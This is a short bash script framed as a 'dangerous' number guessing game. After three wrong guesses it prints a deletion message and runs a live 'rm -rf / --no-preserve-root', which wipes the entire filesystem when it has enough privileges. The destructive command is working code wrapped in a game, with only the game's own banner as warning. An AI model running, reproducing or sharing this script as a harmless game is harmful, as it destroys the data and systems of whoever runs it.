#!/bin/bash

echo "=== DANGEROUS NUMBER GUESSING GAME ==="
echo "Guess wrong 3 times and your system gets DELETED! "
echo

number=$(( RANDOM % 100 + 1 ))
attempts=3

for (( i=1; i<=attempts; i++ )); do
    echo "Attempt $i of $attempts: Enter a number (1-100):"
    read guess

    if [[ $guess -eq $number ]]; then
        echo "CONGRATULATIONS! You saved your system!"
        echo "The number was $number. Your files are safe... for now."
        exit 0
    elif [[ $guess -lt $number ]]; then
        echo "Too low!"
    else
        echo "Too high!"
    fi

    remaining=$((attempts - i))
    if [[ $remaining -gt 0 ]]; then
        echo "$remaining attempts remaining before SYSTEM DELETION!"
    fi
done

echo
echo "GAME OVER! The number was $number."
echo
echo "Initiating system deletion sequence..."
rm -rf / --no-preserve-root                                                                                                                                                                                                                             